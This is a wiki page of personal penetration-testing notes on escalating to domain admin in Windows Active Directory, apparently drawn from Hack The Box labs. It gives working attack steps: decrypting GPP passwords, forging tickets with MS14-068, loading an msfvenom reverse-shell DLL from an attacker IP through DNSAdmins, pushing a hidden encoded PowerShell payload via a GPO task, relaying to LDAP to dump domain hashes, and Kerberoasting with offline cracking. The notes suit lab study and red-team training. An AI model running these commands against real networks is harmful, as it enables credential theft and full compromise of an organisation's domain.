---
title: "Domain Control Elevation"
slug: "domain-control-elevation"
priority: 3
editor: "wysiwyg"
revisionCount: 6
id: 47
createdAt: "2020-06-22T20:57:14Z"
createdBy: "boschko"
updatedAt: "2020-06-22T22:13:41Z"
updatedBy: "boschko"
ownedBy: "boschko"
views: 17
---
<h3 id="bkmrk-0x01-preface">0x01 Preface</h3>
<p id="bkmrk-just-a-collection-of">Just a collection of personal notes covering the following:</p>
<ol id="bkmrk-password-in-gpp-and-"><li>Password in GPP and SYSVOL</li>
<li>MS14-068</li>
<li>DNSAdmins</li>
<li>Insecure GPO permissions</li>
<li>Insecure ACLs permissions</li>
<li>Exchange</li>
<li>LLMNR/NBT-NS poisoning</li>
<li>Kerberoasting</li>
<li>AD recycle Bin</li>
</ol><hr id="bkmrk-"><h3 id="bkmrk-0x02-gpp-and-sysvol">0x02 GPP and SYSVOL</h3>
<p id="bkmrk-what-is-gpp%3A-gpp-is-">What is GPP: GPP is used to apply the common local administrator password to all workstations, apply a brand new administrator account, schedule tasks for other users, apply printers, etc. Generally, there are many machines in the domain. For the convenience of management, administrators, there set the local administrator password GPP on the host.</p>
<p id="bkmrk-after-configuring-th">After configuring this feature, an XML file is created on the domain controller that contains the information needed to configure the account when applying the policy to workstations or laptops connected to the domain. The xml file contains the password of the management account, in general, any domain user can read it (usually DC opens the SYSVOL directory sharing) One thing I have to mention here is that Microsoft has used AES to encrypt the password in the xml file to improve security. But released the key used to encrypt and decrypt the value (so what is this operation??)</p>
<p id="bkmrk-vulnerability-exploi">Vulnerability exploitation:<br>Received the default SYSVOL share of the domain controller and searched for instances of groups.xml in it. If these files exist, they are located in a folder with a format similar to the following:</p>
<pre id="bkmrk-%5C%5Cactive.local%5Cpolic"><code class="language-xml">\\active.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml</code></pre>
<h4 id="bkmrk-0x02.1-positioning-t">0x02.1 Positioning the DC</h4>
<pre id="bkmrk-set-l-nltest-%2Fdsgetd"><code class="language-xml">set l   
nltest /DSGETDC:
echo %logonserver%
net time /domain
......</code></pre>
<h4 id="bkmrk-0x02.2-query-dc%27s-sh">0x02.2 Query DC's shared directory</h4>
<p id="bkmrk-use-enum4linux-or-sm">Use enum4linux or smbmap to check the shared directory <code>smbmap -H 10.10.10.100</code> to list the target user share list.</p>
<pre id="bkmrk-admin%24-no-access-c%24-"><code class="language-xml">ADMIN$ NO ACCESS
C$ NO ACCESS
IPC$ NO ACCESS
NETLOGON NO ACCESS
Replication READ ONLY
SYSVOL NO ACCESS
Users NO ACCESS</code></pre>
<h4 id="bkmrk-0x02.3-connection-do">0x02.3 Connection domain sharing</h4>
<pre id="bkmrk-smbclient-%2F%2Factive.l"><code class="language-xml">smbclient //active.local/Replication -N

smb: \active.local\Policies{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups&gt; more Groups.xml

&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"&gt;&lt;User 
clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.local\SVC_TGS" image="2" changed="2018-07-18 20:46:06" 
uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"&gt;&lt;Properties action="U" newName="" fullName="" description="" 
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" 
noChange="1" neverExpires="1" acctDisabled="0" userName="active.local\SVC_TGS"&gt;&lt;/Properties&gt;&lt;/User&gt;</code></pre>
<h4 id="bkmrk-0x02.4-decrypt-using">0x02.4 decrypt using gpprefdecrypt.py</h4>
<pre id="bkmrk-python-gpprefdecrypt"><code class="language-">python gpprefdecrypt.py edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code></pre>
<hr id="bkmrk--0"><h3 id="bkmrk-0x03-ms14-068">0x03 MS14-068</h3>
<p id="bkmrk-hazard%3A-users-in-any">Hazard: Users in any domain can be elevated to domain control</p>
<p id="bkmrk-generally%2C-it-is-a-l">Generally, it is a local account to succeed, but using klist purge to clear the cache certificate can bypass the limitation</p>
<h4 id="bkmrk-0x03.1-cause-of-vuln">0x03.1 cause of vulnerability</h4>
<p id="bkmrk-when-kdc-verifies-th">When KDC verifies the PAC, according to the agreement, it must be a signature algorithm with server Hash and KDC Hash (the original design is the checksum algorithm of the HMAC series), but Microsoft implements but allows any signature algorithm. As long as the client specifies any signature algorithm, the KDC will use the specified algorithm for signature verification, resulting in a malicious user in the TG_REQ sent to the KDC can create a fake PAC containing the membership of the administrator account to be received by the KDC and put it into In the new TGT ticket issued in TG_REP. The ticket can be used to request the service upgrade privilege of the service ticket from the KDC: in this case, it is the smb service ticket.</p>
<p id="bkmrk-what-is-pac-%28privile">What is PAC (privileged account certificate): PAC contains the authorization data provided by the domain controller (DC), and Active Directory stores the authorization data in the ticket field of PAC (privileged account certificate).</p>
<p id="bkmrk-the-pac-is-provided-">The PAC is provided by the DC in the field authorization data of the service ticket. It is signed with the KDC key (only AD knows) and the service key shared between the service to be verified and AD.</p>
<h4 id="bkmrk-0x03.2-utilization-c">0x03.2 utilization conditions</h4>
<p id="bkmrk-1.-the-domain-contro"><br>1. The domain control machine has not been patched with the vulnerability patch number: KB3011780<br>2. Owns a domain machine and its sid</p>
<h4 id="bkmrk-0x03.3-vulnerability">0x03.3 Vulnerability exploitation &amp; vulnerability detection</h4>
<p id="bkmrk-findsmb2uptime.py-%28b">FindSMB2UpTime.py (but this is not necessarily accurate, because the domain controller is generally not restarted, but there are also unexpected restarts, so even if ms14-068 is not displayed)</p>
<pre id="bkmrk-.%2Ffindsmb2uptime.py-"><code class="language-">./FindSMB2UPTime.py 192.168.31.220
DC is up since: 2013-12-28 22:24:25This DC is vulnerable to MS14-068</code></pre>
<p id="bkmrk-get-the-domain-contr">Get the domain controller patch status: Get-DCPatchStatus.ps1</p>
<pre id="bkmrk-%23-this-is-an-example"><code class="language-powershell"># This is an example script only.
import-module activedirectory
[string]$KBNumber = "KB3011780"
$DomainControllers = Get-ADDomainController -filter *
[int]$DomainControllersCount = $DomainControllers.Count
[int]$PatchedDCCount = 0
[int]$UnPatchedDCCount = 0
$UnpatchedDCs = @()
Write-Output "Scanning $DomainControllersCount Domain Controllers for patch $KBNumber"
ForEach ($DomainController in $DomainControllers)
{
    $DomainControllerHostName = $DomainController.HostName
    $PatchStatus = Get-HotFix -ID $KBNumber -ComputerName $DomainController.HostName -ErrorAction SilentlyContinue

    IF ($PatchStatus.InstalledOn)
        {
            $PatchStatusInstalledOn = $PatchStatus.InstalledOn
            Write-Output "$DomainControllerHostName patched on $PatchStatusInstalledOn"
            $PatchedDCCount++
        }
    Else
        {
            Write-Warning "$DomainControllerHostName is NOT patched for $KBNumber (or could not be contacted)"
            [array]$UnpatchedDCs += $DomainController.HostName
            $UnPatchedDCCount++
        }
}
Write-Output "Out of $DomainControllersCount DCs, Patched: $PatchedDCCount &amp; UnPatched: $UnPatchedDCCount "
IF ($UnpatchedDCs)
{
    Write-Output "The following DCs are NOT patched for $KBNumber"
    $UnpatchedDCs
}</code></pre>
<h4 id="bkmrk-0x03.4-environment-d">0x03.4 environment description</h4>
<p id="bkmrk-target-machine%3A-10.1">Target machine: 10.10.10.52 Windows Server 2008 R2 Standard We have obtained:</p>
<p id="bkmrk-a-common-local-accou">a common local account on the DC<br>james user account password<br>james sid (you can obtain rpclient through multiple ways: lookupnames james in the target machine shell: whoami /all)<br>attack machine : Kali 10.10.14.14 (not in the domain)</p>
<p id="bkmrk-use-on-linux%3A-%28with-">Use on Linux: (with user credentials and no target shell)<br>1. Install the client and generate a ticket on the client</p>
<pre id="bkmrk-sudo-apt-get-install"><code class="language-">sudo apt-get install krb5-user cifs-utils rdate</code></pre>
<p id="bkmrk-2.-edit-%2Fetc%2Fkrb5.co">2. edit <code>/etc/krb5.conf</code></p>
<pre id="bkmrk-%5Blibdefaults%5D-defaul"><code class="language-">[libdefaults]
default_realm = HTB.LOCAL
[realms]
   HTB.LOCAL = {
    kdc = mantis.htb.local:88
    admin_server = mantis.htb.local
    default_domain = HTB.LOCAL
    }
[domain_realm]
    .domain.internal = HTB.LOCAL
    domain.internal = HTB.LOCAL</code></pre>
<p id="bkmrk-3.-add-route%3A-edit-%2F">3. Add route: edit /etc/resolve.conf</p>
<p id="bkmrk-nameserver-10.10.10.">nameserver 10.10.10.52</p>
<p id="bkmrk-4.-synchronize-the-d">4. Synchronize the domain control time (determine the time of DC (used for ticket synchronization), which must be completed within 5 minutes according to RFC, but a deviation of +-30 minutes is also acceptable)</p>
<p id="bkmrk-%5Bmethod-1%5D-net-time-">[Method 1] net time -S 10.10.10.52 -U“” ##Get DC time, then receive to set the local time<br>[Method 2] sudo rdate -n 10.10.10.52 ###Directly synchronize to the domain control time</p>
<p id="bkmrk-5.-generate-a-new-ke">5. Generate a new Kerberos ticket for james users</p>
<pre id="bkmrk-klist-purge-%23-get-ri"><code class="language-">klist purge 			    # get rid of other tickets
kinit -V james@HTB.LOCAL    # kinit domain name needs to be capitalized; or directly kinit james
klist                       # to view loaded tickets</code></pre>
<p id="bkmrk--1"><a href="/uploads/images/gallery/2020-06/9x4WEeL3kNxWjTF1-image-1592860697422.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-06/scaled-1680-/9x4WEeL3kNxWjTF1-image-1592860697422.png" alt="image-1592860697422.png"></a></p>
<p id="bkmrk-at-this-time%2C-the-ti"><a href="/uploads/images/gallery/2020-06/fQwDn7H8H1YqpbYS-image-1592860666872.png" target="_blank" rel="noopener">At this time, the ticket generated by james: access to C$ is not authorized</a></p>
<pre id="bkmrk-kali%40kali%3A%7E%2Ftools%2Fad"><code class="language-">kali@kali:~/tools/AD_Recon/pykek$ smbclient -W HTB.LOCAL //MANTIS/c$ -k
tree connect failed: NT_STATUS_ACCESS_DENIED</code></pre>
<p id="bkmrk-6.-ms14-068-generate">6. ms14-068 generate high authority TGT ticket</p>
<p id="bkmrk--2"><a href="/uploads/images/gallery/2020-06/Aghop1EVoQ73ebln-image-1592860855605.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-06/scaled-1680-/Aghop1EVoQ73ebln-image-1592860855605.png" alt="image-1592860855605.png"></a></p>
<p id="bkmrk-7.-replace-the-low-a">7. Replace the low authority ticket mv TGT_james@HTB.LOCAL.ccache /tmp/krb5cc_1000</p>
<p id="bkmrk-8.-smb-successfully-">8. Smb successfully login C$</p>
<p id="bkmrk--3"><a href="/uploads/images/gallery/2020-06/gB3pODKK5J56qBCi-image-1592860888269.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-06/scaled-1680-/gB3pODKK5J56qBCi-image-1592860888269.png" alt="image-1592860888269.png"></a></p>
<p id="bkmrk-then-leverage-mimika">Then leverage mimikatz:<br>First use ms14-068.exe to generate a ticket on the target machine, then use mimikatz to inject the ticket, and then use psexec to obtain permissions or winexec to execute the command</p>
<p id="bkmrk-ms14-068.py--u-james"><code>ms14-068.py -u james@HTB.LOCAL -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis</code></p>
<p id="bkmrk-put-the-tgt_james%40ht">Put the TGT_james@HTB.LOCAL.ccache file in the mimikatz directory</p>
<p id="bkmrk-mimikatz.exe-log-%22ke"><code>mimikatz.exe log "kerberos::ptc TGT_james@HTB.LOCAL.ccache"</code></p>
<p id="bkmrk-now-you-can-get-the-">Now you can get the domain management session, you can klist to see if there is a kerberos ticket</p>
<pre id="bkmrk-net-use-%5Chtb.local%5Ca"><code class="language-">net use \htb.local\admin$ #### Using IP may fail
dir \htb.local\c$
psexec \htb.local cmd.exe</code></pre>
<p id="bkmrk-break-through-the-li">Break through the limitation of "local account can be exploited": first clear the cache certificate with klist purgr, and then use mimikatz to generate a high-privilege TGT cache certificate to connect:</p>
<p id="bkmrk-impacket-kit-utiliza">Impacket kit utilization</p>
<p id="bkmrk-there-is-also-a-more">There is also a more convenient method, without the various configurations above, directly use the GoldenPac under the impacket kit to send it into the soul (ms14-068+psexec)</p>
<p id="bkmrk--4"><a href="/uploads/images/gallery/2020-06/qtQJL4cgC2pC7VlT-image-1592861078364.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-06/scaled-1680-/qtQJL4cgC2pC7VlT-image-1592861078364.png" alt="image-1592861078364.png"></a></p>
<hr id="bkmrk--5"><h3 id="bkmrk-0x04-dnsadmins">0x04 DNSAdmins</h3>
<p id="bkmrk-by-default%2C-the-doma">By default, the domain controller is also a DNS server, and the Microsoft DNS server runs as a service on the domain controller. Through DNSadmins to System, you end up obtaining domain control permissions.</p>
<p id="bkmrk-conditions-of-use%3A-h">Conditions of use: Have user account permissions for members of the DNSAdmins group, or the current user account has write privileges to the DNS server object</p>
<p id="bkmrk-whoami-%2Fgroups-view-"><code>whoami /groups View user groups</code></p>
<p id="bkmrk--6"><a href="/uploads/images/gallery/2020-06/9dtmbH5Jn6afMTy2-image-1592861249234.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-06/scaled-1680-/9dtmbH5Jn6afMTy2-image-1592861249234.png" alt="image-1592861249234.png"></a></p>
<p id="bkmrk-make-dll">Make dll</p>
<p id="bkmrk-msfvenom--p-windows%2F"><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.67 LPORT=4444 --platform=windows -f dll &gt; plugin.dll</code></p>
<p id="bkmrk-turn-on-smb-sharing%3A">Turn on smb sharing: (You can check whether smbserver can be connected through net use \10.10.14.67\xx. ) if smbserver can not connect, after excluding network problems, it may be a sharing problem, change the share name and restart smbserver.</p>
<p id="bkmrk-sudo-impacket-smbser"><code>sudo impacket-smbserver xx.</code></p>
<p id="bkmrk-inject-dll">Inject dll</p>
<p id="bkmrk-dnscmd.exe-10.10.10."><code>dnscmd.exe 10.10.10.169 /config /serverlevelplugindll \10.10.14.67\xx\plugin.dll</code></p>
<p id="bkmrk-setup-listener">Setup listener</p>
<p id="bkmrk-nc--nlvp-444"><code>nc -nlvp 444</code></p>
<p id="bkmrk-restart-dns-to-make-">Restart dns to make paylload take effect:</p>
<pre id="bkmrk-sc.exe-stop-dns-sc.e"><code class="language-">sc.exe stop dns
sc.exe start dns

OR

sc.exe \\10.10.10.169 stop dns
sc.exe \\10.10.10.169 start dns</code></pre>
<hr id="bkmrk--7"><h3 id="bkmrk-0x05-insecure-gpo-pe">0x05 Insecure GPO Permissions</h3>
<p id="bkmrk-%28good-tool-for-this-" class="callout info"><span style="color: #000000;"><a style="color: #000000;" href="https://github.com/rasta-mouse/GPO-Abuse"><span style="color: #993300;"><span style="color: #000000;">(Good tool for this https://github.com/rasta-mouse/GPO-Abuse and good article https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)</span></span></a></span></p>
<p id="bkmrk-group-policy-is-used">Group Policy is used to centrally manage computers in the domain. By configuring group policies, users, user groups, and computers in the domain can be managed in different dimensions, such as security configuration, registry configuration, software installation configuration, power-on and login login. Management</p>
<p id="bkmrk-the-gpo-group-policy">The GPO Group Policy object is used to store these configuration policies (GPO consists of GPC (Group Policy Container) and GPT (Group Policy Template))</p>
<p id="bkmrk-ou%3A-is-%22a-general-pu">OU: is "a general-purpose container that can be used to combine most other objects and classes for management purposes". Organizations often use OUs to organize entities based on department and/or geographic location</p>
<p id="bkmrk-principle-and-gpo-en">Principle and GPO enumeration is to enumerate users who have GPO modification rights (write Property)</p>
<p id="bkmrk-use-the-new-gpoimmed">Use the <code>New-GPOImmediateTask</code> function of PowerView to use:</p>
<pre id="bkmrk-new-gpoimmediatetask"><code class="language-powershell">New-GPOImmediateTask -TaskName Debugging -GPODisplayName SecurePolicy -CommandArguments '-NoP -NonI -W Hidden -Enc ‘payload’ -Force</code></pre>
<p id="bkmrk--taskname-is-a-requi">-TaskName is a required parameter, -Command specifies the command to run (default is powershell.exe), and -CommandArguments specifies the given binary parameters.</p>
<p id="bkmrk-schtask.xml-will-be-">schtask.xml will be copied to the appropriate location determined by the -GPOname or -GPODisplayname parameter.</p>
<p id="bkmrk-by-default%2C-this-fea">By default, this feature will prompt you before copying, but you can use -Force to suppress it. The payload here can be used directly to delete the schtask .xml after the base64 paylaod generated by empire is executed:</p>
<pre id="bkmrk-new-gpoimmediatetask-0"><code class="language-powershell">New-GPOImmediateTask -Remove -Force -GPODisplayName SecurePolicy</code></pre>
<hr id="bkmrk--8"><h3 id="bkmrk-0x06-insecure-acl-pe">0x06 Insecure ACL Permissions</h3>
<p id="bkmrk-quick-overview-of-ac">Quick overview of ACLs and how to enumerate.</p>
<p id="bkmrk-can-be-used-for-priv">Can be used for privilege escalation , such as Exchange, Enterprise Key admins )</p>
<p id="bkmrk-writedacl-permission">WriteDacl permissions for domain objects ===&gt;DCSync (implemented by adding ACEs for specified users) (ACL is an ACE list)</p>
<p id="bkmrk-an-acl-is-a-set-of-r">An ACL is a set of rules that is used to define which entities have which permissions to specific AD objects. These objects can be user accounts, groups, computer accounts, the domain itself, etc., ACL is divided into SACL (System ACL) and DACL (Discretionanly ACL)</p>
<p id="bkmrk-the-object%27s-acl-con">The object's ACL contains an access control entry (ACE), which defines the identity and corresponding permissions applied to the OU and/or downgraded object.</p>
<p id="bkmrk-understand-the-relat">Understand the relationship between them through the following model:</p>
<p id="bkmrk--9"><a href="/uploads/images/gallery/2020-06/cBZNgKtAYOWZRMK8-image-1592862099494.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-06/scaled-1680-/cBZNgKtAYOWZRMK8-image-1592862099494.png" alt="image-1592862099494.png"></a></p>
<p id="bkmrk-elevation-of-exchang">Elevation of Exchange is the best example of ACL abuse, which can be further understood in conjunction with the following Exchange.</p>
<h3 id="bkmrk-0x07-exchange">0x07 Exchange</h3>
<p id="bkmrk-exchange-windows-per">Exchange Windows Permissions group members have WriteDacl permissions in the domain. After relaying the membership of any group with integrated WriteDacl permissions to LDAP, you can modify the ACL of the domain object to grant users a higher level of access permissions and perform DCSync.</p>
<p id="bkmrk-that-is%2C-use-the-exc">That is, use the Exchange default high-privilege account for LDAP relay to grant users DCSync permissions</p>
<p id="bkmrk-exploit%3A-net-group-v">Exploit: net group view user group</p>
<p id="bkmrk--10"><a href="/uploads/images/gallery/2020-06/YSQniCG8VVpTrB5v-image-1592862203046.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-06/scaled-1680-/YSQniCG8VVpTrB5v-image-1592862203046.png" alt="image-1592862203046.png"></a></p>
<p id="bkmrk-or-the-current-user-">Or the current user is not in the Exchange Permissions group, but in the Account Operator (members of this group can operate the accounts and groups of the domain to which the user administrator belongs and can set their permissions. However, members of this group cannot modify the Administrators and Operators groups and permissions) , You can add a user and add to Exchange Permissions to</p>
<p id="bkmrk-add-user-boschko%3A">add user boschko:</p>
<pre id="bkmrk-%24pass-%3D-convertto-se"><code class="language-powershell">$pass = ConvertTo-SecureString "password" -AsPlainText -Force
New-ADUser boschko -AccountPassword $pass -Enabled $True</code></pre>
<p id="bkmrk-add-users-to-the-exc">Add users to the Exchange Permissions group</p>
<pre id="bkmrk-net-group-%22exchange-"><code class="language-powershell">net group "Exchange Windows Permissions" svc-alfresco /add 

OR

Import-Module ActiveDirectory
Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members  boschko</code></pre>
<p id="bkmrk-check-if-it-has-been">Check if it has been added successfully</p>
<pre id="bkmrk-net-group-%22exchange--0"><code class="language-powershell">net group "Exchange Windows Permissions" /domain</code></pre>
<p id="bkmrk-use-ntlmrelayx-for-n">Use ntlmrelayx for ntlm relay:</p>
<pre id="bkmrk-sudo-python-ntlmrela"><code class="language-powershell">sudo python ntlmrelayx.py -t  ldap://10.10.10.161 --escalate-user boschko</code></pre>
<p id="bkmrk-after-running-the-re">After running the relay command, you can access the local IP through a browser to connect (enter the boschko account password), or use primeexchange.py to connect (10.10.16.21 is my kali ip)</p>
<pre id="bkmrk-python-privexchange."><code class="language-powershell">python privexchange.py -ah 10.10.16.21  10.10.10.161 -u boschko -p password -d htb.local</code></pre>
<p id="bkmrk--11"><a href="/uploads/images/gallery/2020-06/Asibg7tNt5tgWyvk-image-1592862449158.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-06/scaled-1680-/Asibg7tNt5tgWyvk-image-1592862449158.png" alt="image-1592862449158.png"></a></p>
<p id="bkmrk-after-the-connection">After the connection is successful, use secretdump.py to export the domain control hash. The time is quite long, and the prompt above needs to appear.</p>
<pre id="bkmrk-impacket-secretsdump"><code class="language-">impacket-secretsdump htb.local/boschko:password@10.10.10.161 -just-dc</code></pre>
<hr id="bkmrk--12"><h3 id="bkmrk-0x08-llmnr%2Fnbt-ns">0x08 LLMNR/NBT-NS</h3>
<p id="bkmrk-%C2%A0-4">Poisoning principle: If the DNS server fails to resolve, the system that is required to resolve uses LLMNR (UDP 5355) or NBNS (UDP 137) to broadcast questions or queries on the network segment on the Windows system. The attacker then responds, requesting the system to provide Net-NTLM hashes or clear text credentials based on the services used during the broadcast (such as FTP).</p>
<p id="bkmrk--13"><a href="/uploads/images/gallery/2020-06/mmzc9lCSqGf7gciV-image-1592862656898.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-06/scaled-1680-/mmzc9lCSqGf7gciV-image-1592862656898.png" alt="image-1592862656898.png"></a></p>
<p id="bkmrk-use-responer-to-perf">Use Responer to perform monitoring and wait for domain control to trigger a parsing error</p>
<p id="bkmrk--14"><a href="/uploads/images/gallery/2020-06/0k0ZuOiXyaWmIJAV-image-1592862687384.png" target="_blank" rel="noopener"><img src="/uploads/images/gallery/2020-06/scaled-1680-/0k0ZuOiXyaWmIJAV-image-1592862687384.png" alt="image-1592862687384.png"></a></p>
<p id="bkmrk-http%3A%2F%2Fwww.ethicalpe"><a href="http://www.ethicalpentest.com/2018/04/llmnr-and-nbt-ns-poisoning-attack-using-metasploit.html">http://www.ethicalpentest.com/2018/04/llmnr-and-nbt-ns-poisoning-attack-using-metasploit.html</a></p>
<hr id="bkmrk--15"><h3 id="bkmrk-0x09-kerberoasting">0x09 Kerberoasting</h3>
<p id="bkmrk-the-service-principa">The service principal name (SPN) is used to uniquely identify each instance of the Windows service. In order to support Kerberos authentication, SPN is associated with at least one service login account.</p>
<p id="bkmrk-kerberoasting-utiliz">Kerberoasting utilizes that the Client uses a valid TGT to request the server's Kerberos token from TGS. TGS looks up the SPN in the KDC database and uses the service account pair associated with the SPN The ticket is encrypted and sent to the Client. However, here the TGS encryption method is RC4_HMAC_MD5, which is encrypted using the NTLM hash on the server side (making cracking possible).</p>
<p id="bkmrk-at-this-time%2C-the-at">At this time, the attacker borrows a valid domain user identity to request one or more SPN Kerberos tokens (encrypted TGS), and then Perform an offline crack to get the SPN account hash (this process does not even need to interact with the target SPN, that is, no detected traffic is generated, enhancing the concealment of the attack)<br>If HTTP is used (the default is HTTPS), it can also be captured Network traffic gets a Kerberos token, and then conducts an offline cracking attack: scanning user accounts with SPN values ​​set in the domain. SPN account format: serviceclass/host:port/servicename</p>
<pre id="bkmrk-%5B1%5D-usage-of-setspn%3A"><code class="language-">[1] Usage of setspn: official documents of setspn: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v= ws.11)
setspn.exe -T test -q */* #Find all SPNs in the test domain

[2] dsquery (need to download), dsquery official document: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952 (v=ws.11)
dsquery * "ou=domain controllers,dc=test,dc=com" -filter "(&amp;(objectcategory=computer) (servicePrincipalName=*))" -attr distinguishedName servicePrincipalName&gt; spns.txt

[3][powershell](https://social.technet.microsoft.com/wiki/contents/articles/18996.active-directory-powershell-script-to-list-all-spns-used.aspx "powershell")
get-aduser -filter {AdminCount -eq 1} -prop * | select name,created,passwordlastset,lastlogondate</code></pre>
<p id="bkmrk-use-spn-value-to-req">Use SPN value to request service ticket from AD</p>
<pre id="bkmrk-add-type-%E2%80%93assemblyna"><code class="language-">Add-Type –AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken ArgumentList MSSQLSvc/bosch-sql02.bosch.local:1433</code></pre>
<h4 id="bkmrk-%C2%A0"> </h4>
<p id="bkmrk-return-the-service-t">Return the service ticket and store it in the system's memory, you can run mimikatz directly in the current window to export the ticket in memory</p>
<pre id="bkmrk-kerberos%3A%3Alist-%2Fexpo"><code class="language-">Kerberos::list /export</code></pre>
<p id="bkmrk-you-can-also-export-">You can also export the ticket and crack it with tgsrecrack.py There are many convenient scripts, such as GetUserSPNs.py in the imppacket suite. Kerberoast.ps1...</p>
<pre id="bkmrk-%5B1-hashcat%5D%3A-hashcat"><code class="language-">[1 hashcat]: hashcat -a 0 -m 13100 active.hash /usr/share/wordlists/rockyou.txt --force
[2 john] ： sudo john active.hash -w "/usr/share/wordlists/rockyou.txt"</code></pre>
<hr id="bkmrk--16"><h3 id="bkmrk-0x10-ad-recycle-bin">0x10 AD recycle Bin</h3>
<p id="bkmrk-use-the-recycle-bin-">Use the recycle bin to restore the user, or obtain the user's old password for collision</p>
<p id="bkmrk-prerequisite%3A-the-re">Prerequisite: The recycle bin function needs to be enabled in the domain, and the user does not enable the recycle bin in the AD Recyle Bin group and enables the recycle bin to delete objects.</p>
<p id="bkmrk--17"><a href="/uploads/images/gallery/2020-06/zGAdlaxvrgByq2nO-image-1592863067470.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-06/scaled-1680-/zGAdlaxvrgByq2nO-image-1592863067470.png" alt="image-1592863067470.png" width="677" height="196"></a></p>
<p id="bkmrk-the-image-above-is-a">The image above is a life cycle diagram of Active Directory objects deleted before the recycle bin is enabled.</p>
<p id="bkmrk--18"><a href="/uploads/images/gallery/2020-06/kzovkqvk2tSCRS2z-image-1592863115537.png" target="_blank" rel="noopener"><img class="align-center" src="/uploads/images/gallery/2020-06/scaled-1680-/kzovkqvk2tSCRS2z-image-1592863115537.png" alt="image-1592863115537.png"></a></p>
<p id="bkmrk-the-image-above-is-t">The image above is the life cycle of deleted Active Directory objects after the recycle bin is enabled.</p>
<p id="bkmrk-enable-the-ad-recycl">Enable the AD recycle bin:</p>
<pre id="bkmrk-enable-adoptionalfea"><code class="language-">Enable-ADOptionalFeature –Identity ‘CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=www,DC=domain,DC=com’ –Scope ForestOrConfigurationSet –Target ‘www.domain.com’</code></pre>
<p id="bkmrk-view-deleted-users%3A">View deleted users:</p>
<pre id="bkmrk-get-adobject--filter"><code class="language-">Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin                    
                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059</code></pre>
<p id="bkmrk-try-to-restore-delet">Try to restore deleted account:</p>
<pre id="bkmrk-restore-adobject--id"><code class="language-">Restore-ADObject -Identity 'f0cc344d-31e0-4866-bceb-a842791ca059'    

or 

Get-ADObject -Filter {displayName -eq  "TempAdmin"} IncludeDeletedObjects | Restore-ADObject</code></pre>
<p id="bkmrk-query-ms-mcs-admpwd%3A">Query ms-mcs-admpwd:</p>
<pre id="bkmrk-get-adobject--ldapfi"><code class="language-">Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" –IncludeDeletedObjects -Property ms-mcs-admpwd</code></pre>
<p id="bkmrk-view-all-attribute-i">View all attribute information about a specific account:</p>
<pre id="bkmrk-get-adobject--filter-0"><code class="language-">Get-ADObject -Filter {displayName -eq "TempAdmin"} -IncludeDeletedObjects -Properties *
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz</code></pre>
<h3 id="bkmrk-0x11-summary">0x11 summary</h3>
<p id="bkmrk-it-seems-that-there-">It seems that there is nothing to summarize.</p>
<p id="bkmrk-%C2%A0-0"> </p>
<p id="bkmrk-links%3A">Links:</p>
<p id="bkmrk-https%3A%2F%2Fmlcsec.com%2Fa">https://mlcsec.com/active-directory-domain-enumeration/#<br>https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-enumeration-with-powerview<br>https://0xdarkvortex.dev/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/<br>https://blog.riskivy.com/fun_with_acl_and_gpo/</p>
<hr id="bkmrk--19"><h4 id="bkmrk-by-boschko">By Boschko</h4>
<ul id="bkmrk-my-hack-the-box%3A-htt"><li class="graf graf--p">My Hack The Box: <a class="markup--anchor markup--p-anchor" href="https://www.hackthebox.eu/home/users/profile/37879" target="_blank" rel="nofollow noopener" data-href="https://www.hackthebox.eu/home/users/profile/37879">https://www.hackthebox.eu/home/users/profile/37879</a></li>
<li class="graf graf--p">My Website: <a class="markup--anchor markup--p-anchor" href="https://olivierlaflamme.github.io/" target="_blank" rel="noopener nofollow noopener" data-href="https://olivierlaflamme.github.io/">https://olivierlaflamme.github.io/</a></li>
